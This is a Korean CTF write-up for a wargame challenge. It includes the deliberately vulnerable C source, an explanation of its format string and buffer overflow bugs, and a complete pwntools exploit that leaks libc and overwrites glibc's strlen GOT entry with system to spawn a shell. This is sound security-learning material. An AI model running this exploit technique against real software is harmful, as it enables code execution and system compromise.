https://github.com/hspace-io/Space_Alone/blob/main/problems/Chapter10/ch10.c
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
/*
    Full mitigation
    Stack is unsafe & fprintf is Substitutional way of print string
    But you have writable place
*/
int all_time;
int OTP_flag = 0;
int count;
int mode;
FILE *access_log;

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}


void gadget() {
    asm("pop %rdi; ret");
    asm("pop %rsi; pop %r15; ret");
    asm("pop %rdx; ret");
}
char print_checkpass() {
    puts("Enter your password");
    printf("Password : ");
    return 0;
}

char check_passwd(char *passwd, int mode) {
    print_checkpass();
    int acss_ok = -1;
    access_log = fopen("access.log", "a");

    read(0, passwd, 100);
    // passwd[strlen(passwd)] = '\x00';
    switch(mode) {
    case 0:
        fprintf(access_log, "Lord Of BOF : ");
        fprintf(access_log, passwd);
        break;
    case 2:
        // Doctor
        fprintf(access_log, "   Doctor   : ");
        fprintf(access_log, passwd);
        // printf(passwd);
        break;
    default:
        fprintf(access_log, "Undefined User, Error\n");
        // break;
        return 0;
    }

    if (!strncmp(passwd, "9a9f3a5a6230124a1770cc20097db3713454343a", 40)) {
        // lordofbof sha1
        acss_ok = 0;
        fprintf(access_log, " -> Correct!");
        // return 0;
    } else if(!strncmp(passwd, "1f0160076c9f42a157f0a8f0dcc68e02ff69045b", 40)) {
        // doctor sha1
        acss_ok = 2;
        fprintf(access_log, " -> Correct!");
        // return 1;
    } else {
        acss_ok = -1;
        fprintf(access_log, " -> Incorrect!");
        // return 3;
    }

    fprintf(access_log, "\n");
    fclose(access_log);
    return acss_ok;
}

char check_id(char *str_adr) {
    printf("Your ID : ");
    read(0, str_adr, 0x20);
    if (!strncmp(str_adr, "Lord Of Buffer overflow", 23)) {
        return 0;
    } else if(!strncmp(str_adr, "Zombie", 6)) {
        return 1;
    } else if(!strncmp(str_adr, "Doctor", 6)) {
        return 2;
    } else {
        return 3;
    }
}

int main(int argc, char const *argv[]) {
    initialize();
    // stack high
    char welcome[28] = "For vaccine, Enter One Time Passcode";
    char id_number[64];
    char password[0x40]; 
    count = 0;
    int chk_pw = -1;
    printf(welcome);
    puts("");
    printf("Enter ID Number");
    puts("");
    do {
        int chk = check_id(id_number);
        // only leak
        switch(chk) {
        case 0:
            // LOB
            printf("Lord Of BOF! ");
            chk_pw = check_passwd(password, 0);
            break;
        case 1:
            // Zombie
            printf("Zombie! ");
            puts("You Don't need Vaccine~");
            
            access_log = fopen("access.log", "a");
            fprintf(access_log, "Zombie : Denied");
            fclose(access_log);
            break;
        case 2:
            // Doctor
            printf("Doctor! ");
            puts("You can get Vaccine if you pwn");
            chk_pw = check_passwd(password, 2);
            break;
        case 3:
            printf(id_number);
            printf("!Invalid!\nTry Again\n");
            chk_pw = 0;

            access_log = fopen("access.log", "a");
            fprintf(access_log, "Invalid ID\n");
            fclose(access_log);
            break;
        default:
            puts(id_number);
            printf("Error! Enter Your ID Again!");
            chk_pw = 0;



            access_log = fopen("access.log", "a");
            fprintf(access_log, "ID Input Error\n");
            fclose(access_log);
            break;
        }

        if(chk_pw == -1) {
            puts(password);
        } else if(chk_pw == 0) {
            chk_pw = 0;
        } else {
            goto get_vaccine;
        }
        count++;
        if (count == 3) {
            puts("BOOM!! Find your ID");
            return 0;
        }
    } while (1);

get_vaccine:
    puts("No Vaccine");

    //     printf("adsf");
    return 0;
}

```

이 문제의 핵심 취약점은 ``printf(id_number);``와 ``fprintf(access_log, passwd);``에서 발생한다.  
printf에서는 id_number를 그대로 인자로 사용하기 때문에, 앞서 풀었던 문제와 똑같은 이유로 Format String Bug가 발생하고,  
fprintf에서는 access_log에 쓰는 값이 passwd인데 이때 공격자가 passwd의 값을 컨트롤할 수 있기 때문에 Format String Bug가 발생한다.  
fprintf에서도 형식 지정자는 사용 가능하기 때문이다.  

핵심 취약점은 아니지만 passwd가 0x40인데 ``read(0, passwd, 100);``로 0x64 길이만큼 입력받아서 발생하는 Buffer Overflow 취약점 또한 있다.  
하지만 ROP 체인을 쓰기에는 공간이 너무 한정적이라 이번 풀이에서는 쓰지 않았다.  

ID가 유효한 값이 아니면 ``printf(id_number);``로 그대로 출력하기 때문에, ID에 FSB payload를 넣어서 Arbitrary Read가 가능해진다.  
또한 glibc 2.35에서는 내부적으로 ABS를 사용한다. 이는 libc에서 사용하는 함수 포인터로, 예시로는 ``puts`` 함수 호출 시 사용하는 strlen이 있다.  
문제는 glibc 2.35가 Partial RELRO로 컴파일되었기 때문에, ABS@GOT를 덮음으로써 libc 차원에서의 GOT Overwrite가 가능하다.  
따라서 libc 주소를 유출해 system과 strlen@got.plt 주소를 알아내고, FSB로 strlen@got.plt를 system으로 덮으면 된다.  
원래는 ``puts(password);``로 password를 출력하였지만, strlen@got.plt가 system으로 변조되면서 password에 적혀있는 것을 ``system()`` 함수의 인자로 쓰게 된다.  
따라서 password의 내용 맨앞에 "/bin/sh"을 적어주면 이는 곧 ``system("/bin/sh");``과 같아지게 된다.  

필자는 지금껏 문제를 풀어오면서 동적 분석을 쓴 적이 없어서(정확히는 쓸 수가 없어서), 이번에도 ``AAAAAAAA $n$p`` 페이로드를 사용하여 노가다를 통해 스택에서의 위치를 파악했다.  

strlen@got.plt는 libc를 gdb로 열어 puts 함수를 disassemble 한 후,
```
0x0000000000080e63 <+19>:    call   0x28490 <*ABS*+0xa86a0@plt>
.
.
.

pwndbg> x/3i 0x28490
   0x28490 <*ABS*+0xa86a0@plt>: endbr64
   0x28494 <*ABS*+0xa86a0@plt+4>:       bnd jmp QWORD PTR [rip+0x1f1bfd]        # 0x21a098 <*ABS*@got.plt>
   0x2849b <*ABS*+0xa86a0@plt+11>:      nop    DWORD PTR [rax+rax*1+0x0]
```
의 과정을 거쳐 오프셋을 구하였다.  

이제 모든 정보가 갖춰졌으니 익스플로잇을 작성하면 된다.  
문제는 password의 시작이 /bin/sh로 시작해야 해서 pwntools의 fmtstr_payload를 사용할 수 없다.  
그래서 귀찮지만 직접 Format String Bug payload를 작성해야 했다.  
또한 strlen@got.plt도 libc 주소이기 때문에 모든 주소를 다 덮을 것 없이 하위 4바이트만 system의 주소로 덮어줘도 유효하다.  
그냥 한번에 다 덮고 싶었는데 숫자가 너무 커서 그냥 2바이트씩 나눠서 따로 덮는 방식으로 다시 작성했다.  

익스플로잇은 아래와 같다:
```
from pwn import *
context.arch = "amd64"

p = process('./final')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

p.sendafter(b"Your ID : ", b"%33$p")
libc_base = int(p.recv(14), 16) - libc.libc_start_main_return
print(f"[+] libc_base: {hex(libc_base)}")

system = libc_base + libc.symbols['system']
system_low1 = system & 0xffff
system_low2 = (system >> 16) & 0xffff
libc_strlen_got = libc_base + 0x21a098

payload = b"/bin/sh;"
payload += f"%{system_low1 - 8}c%32$hn".encode()
payload += f"%{(system_low2 - system_low1) % 0x10000}c%33$hn".encode()
payload = payload.ljust(0x28, b'A')
payload += p64(libc_strlen_got)
payload += p64(libc_strlen_got + 2)

p.sendafter(b"Your ID : ", b'Lord Of Buffer overflow')
p.sendafter(b"Password : ", payload)

p.interactive()
```

위의 익스플로잇을 실행하여 Shell을 획득한 후, status 명령어로 마지막 PW를 확인한다.
```
The_Cure_Within_Reach@hsapce-io:~$ python3 expl.py
[+] Starting local process './final': pid 10223
[+] libc_base: 0x7f1764023000
[*] Switching to interactive mode
$ status
UID: 511
All clear!!
■■□□□□□□□□
$
```

이번엔 다음 단계가 존재하지 않고 그냥 ``All Challenge Clear!``만 출력한다.
```
The_Cure_Within_Reach@hsapce-io:~$ next
All Challenge clear!
```
